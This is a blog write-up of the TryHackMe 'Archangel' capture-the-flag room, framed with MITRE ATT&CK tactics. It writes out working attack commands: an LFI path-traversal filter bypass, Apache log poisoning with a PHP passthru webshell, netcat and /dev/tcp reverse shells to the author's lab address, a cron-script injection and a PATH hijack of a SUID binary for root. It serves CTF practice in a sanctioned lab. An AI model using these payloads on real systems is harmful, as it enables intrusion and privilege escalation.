---
layout: post
title: TryHackMe Archangel Writeup(easy)
tags: TryHackMe THM Archangel writeup
categories: writeup
---

_Difficulty:Easy_

<!---
Reconnaissance 	Resource Development 	Initial Access 	Execution 	Persistence 	Privilege Escalation 	Defense Evasion 	Credential Access 	Discovery 	Lateral Movement 	Collection 	Command and Control 	Exfiltration 	Impact
-->

I'm working my way through the easy CTF rooms on TryHackMe which initially was very daunting to me, not having really familiarised myself with the common pentesting tools, techniques and patterns. After doing a few I started getting the hang of it so thought I'd do a write up as I quite enjoyed this room and was interested in learning more about web vulnerabilities. I think I will be doing these more often since they are instructive to me to lay out the procedure and remind me of the tools I used. I will also be using the MITRE ATT&CK framework (see below) to frame the writeup.

## MITRE ATT&CK

| Tactic | Technique | Tool |
|---|---|---|---|---|
| Reconnaissance | Active Scanning (T1595) | Nmap |
|  | Search Victim-Owned Websites (T1594) | Gobuster |
| Initial Access | Content Injectsion (T1659) | Local File Inclusion exploit through Log poisoning |
| Command and Control | Ingress Tool Transfer (T1105) | Python http server |
| Privilege Escalation | Scheduled Task/Job (T0153) | Modifying cron job script |
|  | Abuse Elevation Control Mechanism (T1548) | Exploiting SUID bin with PATH variable modification |

### 1.1 Reconnaissance - Active Scanning

So as all of the easy CTFs I've done on THM we start with active scanning which involves nmap scanning for ports and if there is a hosted http server available we then do some manual searching as well as fuzzing for hidden pages. I've done this a number of times now so I've also written up a script which saves maybe only a few seconds but taught me much even though it's pretty basic, I'll add to this as I learn more. My `recon.sh` script:

```
#!/bin/bash

#enable debugging
#set -x

#constants and inputs
TARGET="$1"
WORDLIST="$2"
#WORDLIST="/usr/share/wordlists/dirb/common.txt"
EXTENSIONS="$3"
#EXTENSIONS=".html,.php,.txt,.xml"

#script
if [ -z "$1" ]; then
    echo "Please provide a target ip"
else
    if [ -z "$2" ]; then
        WORDLIST="/usr/share/wordlists/dirb/common.txt"
        echo "No wordlist supplied. Using default at "$WORDLIST        
    fi
    if [ -z "$3" ]; then
        EXTENSIONS=".html,.php,.txt,.xml"
        echo "No extensions provided. Proceeding with defaults of "$EXTENSIONS        
    fi
    echo "scanning ${TARGET}"
    nmapLog=nmap_${TARGET}_$(date +"%H%M_%d-%m-%y").log

    nmap -sV -Pn $TARGET | tee $nmapLog
    echo "nmap run log saved here "$nmapLog
    if sed -n "5,\$p" $nmapLog | grep http; then
        gobusterLog=gobuster_${TARGET}_$(date +"%H%M_%d-%m-%y").log
        echo "found http service. Proceeding to gobuster"
        echo "Target is $TARGET"
        echo "Wordlist is $WORDLIST"
        gobuster -u "${TARGET}" -w "${WORDLIST}" -x "${EXTENSIONS}" | tee $gobusterLog
    else
        echo "no http service found"
    fi
fi

#disable debugging

set +x
```
The `Nmap` scan for service enumeration (-sV) skipping host discovery (-Pn) shows that ports 22 and 80 are open which is expected and straightforward. It'll be a web exploit we'll need to do so while the script continues on to using `gobuster` to fuzz for files and websites we can start our manual search by navigating the to the ip address provided. 

### 1.2 Reconnaissance - Search Victim-Owned Websites

Searching through the website shows a lot of placeholder text and links that don't go anywhere, which makes it hard to know whether there's some page accessible from the website that's vulnerable. So instead of manually clicking all the links I'll run the page through my [web crawler]((https://github.com/T4ngles/cyberTools/blob/master/siteWatcher/watcher.py)) python script which returns the following pages:
```
http://10.10.34.65/pages/full-width.html
http://10.10.34.65/pages/../index.html
http://10.10.34.65/pages/basic-grid.html
http://10.10.34.65/font-icons.html
http://10.10.34.65/pages/sidebar-left.html
http://10.10.34.65/sidebar-left.html
http://10.10.34.65/gallery.html
http://10.10.34.65/sidebar-right.html
http://10.10.34.65/pages/gallery.html
http://10.10.34.65/full-width.html
http://10.10.34.65/basic-grid.html
http://10.10.34.65/pages/sidebar-right.html
http://10.10.34.65/pages/font-icons.html
http://10.10.34.65/index.html
```
Nothing interesting so we have a look at our gobuster results.

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.34.65/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php,txt,xml,html
[+] Timeout      : 10s
=====================================================
=====================================================
/flags (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/layout (Status: 301)
/licence.txt (Status: 200)
/pages (Status: 301)
=====================================================
=====================================================
```

Hmmm surely it can't be that easy with `/flags`, aaaand I got rick rolled. Ok what else is there? The rest of the pages and dirs I find turn up nothing but having a look at the actual pages shows there is a contact email address that doesn't look like a demo name and is the hostname we need for the first question. How does a hostname help though? Using Burp Suite we can have a look at a web request and we can see that in a HTTP GET request we also send through the hostname that we are requesting for in the http header which is the ip address of the box as given by THM.
![Burp HTTP GET request](/assets/burprequest.png)

Now that we have a different hostname though, changing this in Burp's Repeater to the hostname we just found we get the second flag. Now this means the server is giving different responses with this new hostname in the request so we go back to gobuster. But to allow gobuster to substitute the new hostname instead of the ip address in the request header we need to add a line in our `/etc/hosts` file with the hostname and ip address. After doing that we get the page underdevelopment and can have a look for a vector in. 

### 2 Initial Access - Content Injection

So the page we find has a button which contains a link to another file on the server. Clicking it seems to load that files contents onto the page, we can check this by using the url in the link to load the file directly which contains the text `Control is an illusion`. So this file referencing is called Local File Inclusion (LFI) and can be exploited a number of ways as the server executes the instruction to load a file of the user's choice. Replacing the GET request in burp with `/test.php?view=/etc/passwd` gives us a `Sorry, That's not allowed` so we are on the right track but just need to get around the input restrictions. In comes path traversal, maybe instead of going directly to the passwd file we can traverse to it from the `development_testing` folder. Trying `/test.php?view=/var/www/html/development_testing/../../../../etc/passwd` however gives us the same error message. It looks like the `../` file traversal string are being stripped out, Linux however treats `..//` the same way as `../` so if we use these instead we can avoid the input checks. `/test.php?view=/var/www/html/development_testing/..//..//..//..//etc/passwd` works and gives the passwd file in clear text. Ok next how do we use the LFI vector to get into the system? Log poisoning. We can pass in a GET request which includes some PHP code and then use LFI to load the APACHE `access.log` and get a reverse shell. This goes as follows:

#### Log Poisoning
Netcat in to the http port 

`nc 10.10.34.65 80`

Run the GET request for a non-existent page along with our php payload.

`GET /POISON<?php passthru($_GET['cmd']); ?> HTTP/1.1`

Next we can then request the log either through Burp or using `curl` along with a `cmd`.

`curl -H "HOST: mafialive.thm" 10.10.34.65/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=ls" -s | grep POISON | cut -d "/" -f4`

Here I use curl with the full url, specifying the hostname along with the cmd variable of `ls`. As the `access.log` is usually pretty big we don't want the output hard to find so we just grep for that `POISON` we requested earlier and then `cut` out the web request portion. Now we can see out poison is working we just need to send through a cmd for a reverse shell and we can do that with a standard bash reverse cmd.

`curl -H "HOST: mafialive.thm" 10.10.34.65/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.15.15 4444 >/tmp/f" -s`

aaand we are now www-data.

### 3 Command and Control

After getting into the www-data account and snooping around I did the usual search for low hanging fruit a.k.a. unprotected ssh keys, accessible password files and sudo NOPASS permissions. No luck. So time to load up the linpeas script which is always reliable and lets me stretch my legs while it's running. I run a simple python http server with `python -m http.server 8080` to serve up the `linpeas.sh` script and then run a `wget` from www-data to download it then run it and tee it to a log file in case I need to search it for something later. 

### 4.1 Privilege Escalation - Scheduled Task/Job

Looking at the linpeas output I can see there are some cron jobs scheduled and in particular there is one running every minute by the user `archangel` and also using a script in the accessible `/opt` folder. We can easily just echo in a reverse bash command and get archangel access as follows:

`echo "/bin/bash -i >& /dev/tcp/10.4.15.15/8888 0>&1" >> helloworld.sh`

### 4.2 Privilege Escalation - Abuse Elevation Control Mechanism

After having a look around archangel's files and folders (and getting rickrolled again with a password backup file) I was able to get the user2 flag. I also find a file called `backup` which is owned by root AND has the SUID bit set. Suss. Using `file` on it we find that it's an ELF shared object file, specifically:

>setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9093af828f30f957efce9020adc16dc214371d45, for GNU/Linux 3.2.0, not stripped

After some [researching](https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/) it looks like it is a compiled library that can be used by other binaries but can also be an executable. So seeing as it's owned by root and has the executable flag set we can try to run it. Before that though we can have a sneaky peak inside to see if there's anything interesting we can read with `strings -n 8 backup` which lets us look at the strings hardcoded into the file greater than 8 characters in length. We can see that there is indeed some nice hard coded bits and one in particular that has potential:
`cp /home/user/archangel/myfiles/* /opt/backupfiles`
Excellent, we have out vector. What jumps out in this command is the wildcard which looks like it copies all the files in `myfiles` directory into the `backupfiles` directory as a backup script/binary would do. Ok let's try to run it and see what happens. Error, that folder doesn't exist. So it's referencing /home/user/archangel... when we only have /home/archangel... After what seems like an externity of looking for a way to exploit this binary which included:

- Ways to make folders in the home directory to match whats in the binary.
- Ways to exploit * in commands, which was actually very interesting as tar is an exploitable, see this [discussion paper](https://www.exploit-db.com/papers/33930) on exploit.db. I had some weird idea about naming a file with [backticks](
https://stackoverflow.com/questions/6833582/pass-output-as-an-argument-for-cp-in-bash) to get cp to run a bash shell for me with the wildcard.
- Ways to modify a binary with sed, quite easily doable, but not without changing file ownership.

...I realised I was distracted by the shiny `*` and I should have looked at the `cp` command which is called without a full path. This means I can just append a folder containing a executable file named `cp` to my PATH variable (`export PATH=$PWD:$PATH`) and then run the backup to direct it to that instead of the proper `cp` binary. After putting in a simple `/bin/bash` in a `cp` file with executable permissions then running the `backup` binary we were in with root. Hooray~ 

No final Rick Roll for us :_) 

### Conclusion
This was a great room and getting these CTFs done by thinking, researching and testing feels really rewarding. I hope my writeup is informative and I classified these techniques properly, gives me a good reference frame to approach future CTFs and penetration testing which is what MITRE ATT&CK is for.

Looking forward to the next one. My skills matrix looks a bit weak on the web exploitation as well as windows so I'll head towards there!










